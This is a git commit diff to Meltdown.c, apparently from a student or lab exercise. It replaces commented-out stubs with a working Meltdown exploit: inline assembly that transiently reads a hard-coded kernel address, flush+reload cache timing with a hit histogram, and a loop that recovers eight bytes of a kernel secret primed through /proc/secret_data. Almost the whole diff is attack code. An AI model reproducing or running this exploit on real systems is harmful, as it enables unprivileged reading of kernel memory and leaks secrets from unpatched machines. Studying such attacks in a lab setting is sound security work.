3ba7faec4e28543ae5a3f399ad8ba80cfbf10b22
Alfredo <icealfredo123@gmail.com>
2023-11-13 22:06:58 -0600

    meltdown addition

--- Meltdown.c
+++ Meltdown.c
@@ -1,5 +1,6 @@
 #include <stdint.h>
 #include <stdio.h>
+#include <unistd.h>
 
 #include <emmintrin.h> /*Needed for _mm_cflush*/
 #include <x86intrin.h> /*Needed for __rdtscp*/
@@ -8,7 +9,12 @@
 #include <setjmp.h> /*Needed to jump after catching segfault*/
 
 
-#define THRESHOLD_CYCLES 500
+#include <string.h>
+
+#include <fcntl.h>
+
+
+#define THRESHOLD_CYCLES 300
 
 
 //Create 256 pages of size 4KB
@@ -33,83 +39,45 @@ void flush_probe_array()
 
 void meltdown_attack(unsigned long long kernel_address)
 {
+    //  8-byte register  |  Bytes 0-3  |  Bytes 0-1  |  Byte 0
+    //      %rax         |    %eax     |     %ax     |   %al  
+    //      %rcx         |    %ecx     |     %cx     |   %cl  
+    
+    asm volatile (
+	    "retry:\n\t"
 
-        //TODO MELTDOWN ATTACK ASSEMBLY 
-        //asm volatile (
-        //    "xor %%rax, %%rax\n\t"
-        //    "retry:\n\t"
-        //    "movb (%[address]), %%al\n\t"
-        //    "shl $12, %%rax\n\t"
-        //    "jz retry\n\t"
-        //    "mov (%[address], %%rax, 1), %%rbx\n\t"
-        //    : 
-        //    : [address] "r" (kernel_address), [probe] "r" (probe_array)
-        //    : "rax", "rbx"
-        //);
+	    ".rept 300\n\t"
+	    "add $0x141, %%rax\n\t"
+	    ".endr\n\t"
 
-
-        //asm volatile(
-        //    ".rept 400000;"                
-        //    "add $0x141, %%eax;"
-        //    ".endr;"                    
-        // 
-        //    :
-        //    :
-        //    : "eax"
-        //); 
-
-
-        // Access some of the array items
-        //probe_array[1*4096] = 100;
-        //probe_array[2*4096] = 100;
-        //char data = *(char *)kernel_address; 
-        //probe_array[data * 4096] += 1;
+	    "movzx (%[addr]), %%eax\n\t"
+	    "shl $12, %%rax\n\t"
+	    "jz retry\n\t"
+	    "movzx (%[target], %%rax, 1), %%rbx\n"
+	    :
+	    : [target] "r" (probe_array),
+	      [addr] "r" (kernel_address)
+	    : "rax", "rbx"
+	);
 }
 
 static inline void get_access_time()
 {
-    //for(int i = 0; i < 256; i++){
-    //    unsigned long long time1, time2;  
-    //    unsigned junk;
-    //    
-    //    time1 = __rdtscp(&junk);
-    //    (void)*(&probe_array[i*4096]);
-    //    time2 = __rdtscp(&junk) - time1;       
-    //    printf("Access time for array[%d*4096]: %d CPU cycles\n",i, (int)time2);
-
-    //    //if(time2 - time1 <= THRESHOLD_CYCLES){
-    //    //    printf("Low cycle count: %c, %d\n", i, i);
-    //    //    printf("Number of cycles %lld\n", time2 - time1);
-    //    //}
-    //}
-
     unsigned junk=0;
     register uint64_t time1, time2;
     volatile uint8_t *addr;
-
+    
     for(int i=0; i<256; i++) {
-      addr = &probe_array[i*4096];
-      time1 = __rdtscp(&junk);                
-      (void)*addr;
-      time2 = __rdtscp(&junk) - time1;       
-      printf("Access time for array[%d*4096]: %d CPU cycles\n",i, (int)time2);
+        addr = &probe_array[i*4096];
+        time1 = __rdtscp(&junk);                
+        (void)*addr;
+        time2 = __rdtscp(&junk) - time1;       
+
+        if(time2 < THRESHOLD_CYCLES){
+            histogram[i]++; 
+        }
     }
-
-
 }
-
-
-
-void predict_value()
-{
-    /*
-     * Create function that 
-     * iters each page and
-     * finds out which ones
-     * are below are threshhold
-    */
-}
-
 
 int main(){
 
@@ -121,16 +89,43 @@ int main(){
         probe_array[i*4096]=1;
     }
   
-    flush_probe_array();
+
+    int ret = 0;
+    int fd = open("/proc/secret_data", O_RDONLY);
+    if (fd < 0) {
+        perror("open");
+        return -1;
+    }
 
 
+    for(int secret_index = 0; secret_index < 8; secret_index++){
+        for(int i = 0; i < 1000; i++){
+	        ret = pread(fd, NULL, 0, 0);
+	        if (ret < 0) {
+	            perror("pread");
+	            break;
+	        }
+
+            flush_probe_array();
+
+            if(sigsetjmp(env, 1) == 0){
+                meltdown_attack(0xffffffffc0e64000 + secret_index);
+            }
+
+            get_access_time();
+        }
   
-    meltdown_attack(0xffffffffc0e49000);
-    
-    get_access_time();
+        int page_hit = 0;
+        for(int i = 0; i < 255; i++){
+            if(histogram[i] > histogram[page_hit]){
+                page_hit = i;
+            }
+        }
 
+        memset(histogram, 0, sizeof(histogram));
+        printf("secret value guess %d, %c\n", page_hit, page_hit);
+        printf("number of hits %d\n", histogram[page_hit]);
+    }
 
     return 1;
 }
-
-//meltdown_attack(0xffffffffc0e49000);
